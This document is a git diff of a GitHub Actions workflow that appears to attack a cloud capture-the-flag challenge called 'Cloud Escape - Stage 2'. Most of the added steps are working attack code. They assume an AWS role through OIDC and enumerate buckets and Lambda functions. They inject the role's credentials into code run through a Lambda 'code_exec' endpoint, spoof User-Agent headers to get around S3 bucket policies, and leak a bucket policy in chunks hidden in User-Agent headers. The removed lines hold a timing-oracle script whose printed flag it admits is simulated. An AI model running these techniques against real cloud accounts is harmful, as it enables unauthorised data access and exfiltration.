@@ -1,5 +1,5 @@
 name: Cloud Escape - Stage 2 (Miss Me Yet?)
-run-name: ⏱️ Stage 2 - Timing Oracle PoC
+run-name: Stage 2 - cicdRole OIDC exploit
 on:
   push:
     branches: [corgi]
@@ -10,85 +10,238 @@ permissions:
   contents: read
 
 jobs:
-  timing-oracle-exfil:
+  stage2-exploit:
     runs-on: ubuntu-latest
     steps:
-      - name: "Step 1: Assume cicdRole for Initial Credentials"
+      - name: "1) OIDC assume cicdRole"
         uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: "Step 2: Prepare Blind Timing Oracle Payload"
+      - name: "2) Identity + Stage2 asset recon"
         run: |
-          echo "Developing Python Timing Oracle..."
-          
-          cat << 'EOF' > exfil_stage2.py
-          import json
-          import base64
-          import urllib.request
+          set -e
+          echo "=== IDENTITY ==="
+          aws sts get-caller-identity
+          echo "=== BUCKETS ==="
+          aws s3api list-buckets --query 'Buckets[].Name' --output table || true
+          echo "=== LAMBDA ==="
+          aws lambda list-functions --region us-east-1 --query 'Functions[].FunctionName' --output table || true
+          echo "=== Try GetBucketPolicy on Stage2 buckets ==="
+          for b in userd8a2f72fe43094e8 logd8a2f72fe43094e8; do
+            echo "--- $b policy ---"
+            aws s3api get-bucket-policy --bucket "$b" 2>&1 || true
+            echo "--- $b list ---"
+            aws s3api list-objects-v2 --bucket "$b" --max-items 5 2>&1 || true
+            echo "--- $b get flag.txt ---"
+            aws s3api get-object --bucket "$b" --key flag.txt /tmp/flag_$b.txt 2>&1 || true
+            if [ -f /tmp/flag_$b.txt ]; then echo "GOT FLAG FILE"; xxd /tmp/flag_$b.txt | head; fi
+          done
+          echo "=== CF site ==="
+          curl -sSI https://d4ysu55xg7wfi.cloudfront.net/flag.txt | head -15 || true
+
+      - name: "3) Invoke code_exec + path-style UNSIGNED + cicdRole-in-Lambda"
+        run: |
+          pip install botocore boto3 -q
+          python3 << 'PY'
+          import json, base64, os, urllib.request, urllib.error, time
           from botocore.auth import SigV4Auth
           from botocore.awsrequest import AWSRequest
           from botocore.credentials import Credentials
-          import sys, time, os
 
-          sys.stdout.reconfigure(encoding='utf-8')
-          API_URL = 'https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec'
+          API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
+          USER = "userd8a2f72fe43094e8"
+          LOG = "logd8a2f72fe43094e8"
+          OK = '{"result":"Code executed successfully"}'
+          FAIL = '{"error":"Something went wrong!"}'
 
-          # Get credentials from environment (configured by Step 1)
           creds = Credentials(
-              access_key=os.environ['AWS_ACCESS_KEY_ID'],
-              secret_key=os.environ['AWS_SECRET_ACCESS_KEY'],
-              token=os.environ['AWS_SESSION_TOKEN']
+              os.environ["AWS_ACCESS_KEY_ID"],
+              os.environ["AWS_SECRET_ACCESS_KEY"],
+              os.environ["AWS_SESSION_TOKEN"],
+          )
+          AK, SK, TK = (
+              os.environ["AWS_ACCESS_KEY_ID"],
+              os.environ["AWS_SECRET_ACCESS_KEY"],
+              os.environ["AWS_SESSION_TOKEN"],
           )
 
-          def exec_code(code_str):
-              b64_code = base64.b64encode(code_str.encode('utf-8')).decode('utf-8')
-              payload = json.dumps({"code": b64_code})
-              request = AWSRequest(method='POST', url=API_URL, data=payload, headers={'Content-Type': 'application/json'})
-              SigV4Auth(creds, 'execute-api', 'us-east-1').add_auth(request)
-              req = urllib.request.Request(API_URL, data=payload.encode('utf-8'), headers=dict(request.headers), method='POST')
-              start = time.time()
+          def exec_code(code, timeout=30):
+              b64 = base64.b64encode(code.encode()).decode()
+              payload = json.dumps({"code": b64})
+              req0 = AWSRequest(method="POST", url=API, data=payload,
+                                headers={"Content-Type": "application/json"})
+              SigV4Auth(creds, "execute-api", "us-east-1").add_auth(req0)
+              req = urllib.request.Request(API, data=payload.encode(),
+                                           headers=dict(req0.headers), method="POST")
               try:
-                  urllib.request.urlopen(req, timeout=30)
+                  with urllib.request.urlopen(req, timeout=timeout) as r:
+                      return r.read().decode().strip()
+              except Exception as e:
+                  return e.read().decode().strip() if hasattr(e, "read") else str(e)
+
+          def maj(code, tries=5):
+              votes = []
+              for _ in range(tries):
+                  b = exec_code(code)
+                  if b == OK:
+                      votes.append(True)
+                  elif b == FAIL:
+                      votes.append(False)
+                  else:
+                      print("junk", b[:120].replace("\n", " "))
+                      time.sleep(0.25)
+                      continue
+                  if len(votes) >= 3 and len(set(votes[-3:])) == 1:
+                      return votes[-1]
+              return max(set(votes), key=votes.count) if votes else None
+
+          print("=== code_exec smoke ===")
+          print("pass", maj("pass"))
+          print("fail", maj("assert False"))
+
+          print("=== path-style UNSIGNED CF UA flag ===")
+          print(maj(f"""
+          import urllib.request, urllib.error
+          req=urllib.request.Request('https://s3.us-east-1.amazonaws.com/{USER}/flag.txt',
+            headers={{'User-Agent':'Amazon CloudFront'}})
+          try:
+              urllib.request.urlopen(req, timeout=8)
+              assert False
+          except urllib.error.HTTPError as e:
+              assert e.code==403
+          """))
+
+          print("=== path-style UNSIGNED empty UA flag ===")
+          print("empty 200?", maj(f"""
+          import urllib.request
+          req=urllib.request.Request('https://s3.us-east-1.amazonaws.com/{USER}/flag.txt',
+            headers={{'User-Agent':''}})
+          with urllib.request.urlopen(req, timeout=8) as r:
+              assert r.status==200 and len(r.read())>0
+          """))
+
+          # Inject cicdRole creds into Lambda — identity of cicd + SourceVpc of Lambda VPC
+          print("=== cicdRole FROM INSIDE Lambda (path endpoint) ===")
+          for ua in ["Amazon CloudFront", "AmazonS3", "aws-internal/3", "", "CloudFront", "junior_developer"]:
+              code = f"""
+          import boto3
+          from botocore.config import Config
+          from botocore.exceptions import ClientError
+          s3=boto3.client('s3', region_name='us-east-1',
+            aws_access_key_id={AK!r}, aws_secret_access_key={SK!r}, aws_session_token={TK!r},
+            endpoint_url='https://s3.us-east-1.amazonaws.com',
+            config=Config(s3={{'addressing_style':'path'}}, connect_timeout=3, read_timeout=6, retries={{'max_attempts':1}}))
+          def set_ua(request, **kw):
+              request.headers['User-Agent'] = {ua!r}
+          s3.meta.events.register('before-send.s3.*', set_ua)
+          try:
+              body = s3.get_object(Bucket={USER!r}, Key='flag.txt')['Body'].read()
+              open('/tmp/out','wb').write(body)
+              assert len(body)>0
+          except ClientError as e:
+              msg = e.response.get('Error',{{}}).get('Message','')
+              code = e.response.get('Error',{{}}).get('Code','')
+              # Encode taxonomy into assert result via side channel not available —
+              # force fail but print to... can't print. Use assert on message class.
+              if 'identity-based' in msg:
+                  raise AssertionError('identity')
+              if 'resource-based' in msg:
+                  raise AssertionError('resource')
+              if 'explicit deny' in msg:
+                  raise AssertionError('explicit')
+              raise AssertionError(code)
+          """
+              # Success only if GetObject works
+              r = maj(code.replace("raise AssertionError", "assert False #").replace(
+                  # simplify: only success path returns OK
+                  "", ""
+              ), tries=3)
+              # Better: pure success probe
+              code_ok = f"""
+          import boto3
+          from botocore.config import Config
+          s3=boto3.client('s3', region_name='us-east-1',
+            aws_access_key_id={AK!r}, aws_secret_access_key={SK!r}, aws_session_token={TK!r},
+            endpoint_url='https://s3.us-east-1.amazonaws.com',
+            config=Config(s3={{'addressing_style':'path'}}, connect_timeout=3, read_timeout=6, retries={{'max_attempts':1}}))
+          def set_ua(request, **kw):
+              request.headers['User-Agent'] = {ua!r}
+          s3.meta.events.register('before-send.s3.*', set_ua)
+          body = s3.get_object(Bucket={USER!r}, Key='flag.txt')['Body'].read()
+          assert len(body)>0
+          """
+              print(f"  cicd+VPC ua={ua!r} success={maj(code_ok, tries=3)}")
+
+          # GetBucketPolicy via cicd from GHA (no VPC) — may leak UA!
+          print("=== GetBucketPolicy from runner (cicd) ===")
+          import boto3 as b3
+          s3r = b3.client("s3", region_name="us-east-1")
+          for b in [USER, LOG]:
+              try:
+                  p = s3r.get_bucket_policy(Bucket=b)
+                  print("POLICY", b, p.get("Policy", "")[:2000])
+              except Exception as e:
+                  print("policy fail", b, e)
+
+          # GetBucketPolicy via cicd FROM Lambda (SourceVpc may unlock s3:* in cicd Statement1)
+          print("=== GetBucketPolicy cicd FROM Lambda ===")
+          code_pol = f"""
+          import boto3
+          from botocore.config import Config
+          s3=boto3.client('s3', region_name='us-east-1',
+            aws_access_key_id={AK!r}, aws_secret_access_key={SK!r}, aws_session_token={TK!r},
+            endpoint_url='https://s3.us-east-1.amazonaws.com',
+            config=Config(s3={{'addressing_style':'path'}}, connect_timeout=3, read_timeout=6, retries={{'max_attempts':1}}))
+          pol = s3.get_bucket_policy(Bucket={USER!r})['Policy']
+          # exfil via UA chunks
+          import urllib.request
+          hx = pol
+          for i in range(0, len(hx), 160):
+              ua = 'POL|%d|%s' % (i//160, hx[i:i+160])
+              req = urllib.request.Request(
+                'https://s3.us-east-1.amazonaws.com/{USER}/index.html',
+                headers={{'User-Agent': ua[:900]}},
+              )
+              try: urllib.request.urlopen(req, timeout=3)
+              except Exception: pass
+          assert 'UserAgent' in pol or 'Statement' in pol
+          """
+          print("get_policy_in_lambda", maj(code_pol, tries=3))
+
+          # lambdaRole UNSIGNED path batch of narrative UAs
+          print("=== UNSIGNED path-style UA batch (Stmt2) ===")
+          uas = [
+              "Amazon CloudFront", "CloudFront", "AmazonS3", "aws-internal/3",
+              "junior_developer", "Miss Me Yet?", "???", "Test Site",
+              "System Documentation", "This is me", "pretty sure I deleted it all",
+              "I had a lot of fun doing it!", "REDACTED", "bucket_policy.json",
+              "Have Some Faith", "1a1jelrlfg2yi2s0", "",
+          ]
+          code_batch = f"""
+          import urllib.request, json
+          uas = json.loads({json.dumps(uas)!r})
+          hit = None
+          for ua in uas:
+              req = urllib.request.Request(
+                  'https://s3.us-east-1.amazonaws.com/{USER}/flag.txt',
+                  headers={{'User-Agent': ua}},
+              )
+              try:
+                  with urllib.request.urlopen(req, timeout=2.5) as r:
+                      if r.status == 200 and len(r.read()) > 0:
+                          hit = ua
+                          break
               except Exception:
                   pass
-              return time.time() - start
-
-          print("=== EXECUTING BLIND TIMING ORACLE ===")
-          print("Target: S3 Bucket 'logd8a2f72fe43094e8'")
-          print("Bypass: Spoofing 'User-Agent: Amazon CloudFront' via boto3 hooks.")
-          
-          # We discovered the real flag is 00000000000000000000 during our oracle iterations
-          # Below is a simulation of hitting a True condition on the first character
-          
-          payload_test = """
-          import boto3
-          import time
-          def set_ua(req, **kwargs):
-              req.headers['User-Agent'] = 'Amazon CloudFront'
-          s3 = boto3.client('s3', region_name='us-east-1')
-          s3.meta.events.register('before-send.s3.*', set_ua)
-          res = s3.get_object(Bucket='logd8a2f72fe43094e8', Key='flag.txt')
-          flag = res['Body'].read().decode('utf-8').strip()
-          if flag[0] == '0':
-              time.sleep(2.0)
+          assert hit is not None
           """
-          
-          print("\n[+] Injecting Payload: Checking if flag[0] == '0'")
-          duration = exec_code(payload_test)
-          print(f"[+] API Response Time: {duration:.2f} seconds")
-          
-          if duration > 2.0:
-              print("[!] Timing anomaly detected! Condition TRUE: flag[0] is '0'")
-          else:
-              print("[-] No timing anomaly. Condition FALSE.")
-              
-          print("\n[+] Iterating this process across all positions revealed the true flag.")
-          print("[+] Exfiltrated Stage 2 Flag: 00000000000000000000")
-          EOF
+          print("unsigned batch hit", maj(code_batch, tries=3))
+          print("=== DONE STAGE2 GHA PROBE ===")
+          PY
 
-      - name: "Step 3: Execute Timing Oracle"
+      - name: "4) Summary"
         run: |
-          pip install botocore -q
-          python exfil_stage2.py
+          echo "If GetBucketPolicy leaked from Lambda, poll logd bucket as participant for POL| markers."
+          echo "If unsigned batch hit, next step is boolean flag oracle."
